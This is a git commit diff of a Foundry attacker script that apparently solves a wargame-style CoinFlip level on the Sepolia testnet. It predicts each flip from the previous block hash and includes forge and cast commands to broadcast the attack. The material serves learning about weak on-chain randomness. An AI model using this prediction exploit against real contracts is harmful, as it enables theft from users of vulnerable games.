6a57621367d54fc6d35454591248d904cd3502e7
RicardoMuchacho <ricardojrmuchacho@gmail.com>
2025-06-02 18:23:30 +0200

    attacker update

--- Level4/attacker.s.sol
+++ Level4/attacker.s.sol
@@ -20,27 +20,29 @@ contract Attacker is Script {
         uint256 privateKey = vm.envUint("PRIVATE_KEY");
         vm.createSelectFork(SEPOLIA_RPC);
 
-       ICoinFlip coinflip = ICoinFlip(target);
+        ICoinFlip coinflip = ICoinFlip(target);
 
         vm.startBroadcast(privateKey);
-      
-        bool res = coinflip.flip(true);
-        console.log("Flip result:", res);
+        
+        // Get current consecutive wins
+        uint256 initialWins = coinflip.consecutiveWins();
+        console.log("Initial consecutive wins:", initialWins);
 
-        // uint256 flips = 10;
-
-        // for (uint256 i = 0; i < flips; i++) {
-        //   uint256 blockValue = uint256(blockhash(block.number - 1));
-        //   uint256 res = blockValue / Factor;
-        //   if(res == 1) {
-        //     coinflip.flip(true);   
-        //   } else {
-        //     coinflip.flip(false);   
-        //   }
-        //   vm.roll(block.number + 1);
-        // }
-
-
+        // Calculate the prediction for the current block
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / Factor;
+        bool side = coinFlip == 1 ? true : false;
+        
+        // Execute the flip with our prediction
+        bool receipt = coinflip.flip(side);
+        console.log("Flip result:", receipt);
+        
         vm.stopBroadcast();
     }
 }
+
+// To run the script:
+// forge script Level4/attacker.s.sol --broadcast --rpc-url wss://sepolia.drpc.org
+
+// To check consecutive wins:
+// cast call 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d "consecutiveWins()(uint256)" --rpc-url wss://sepolia.drpc.org
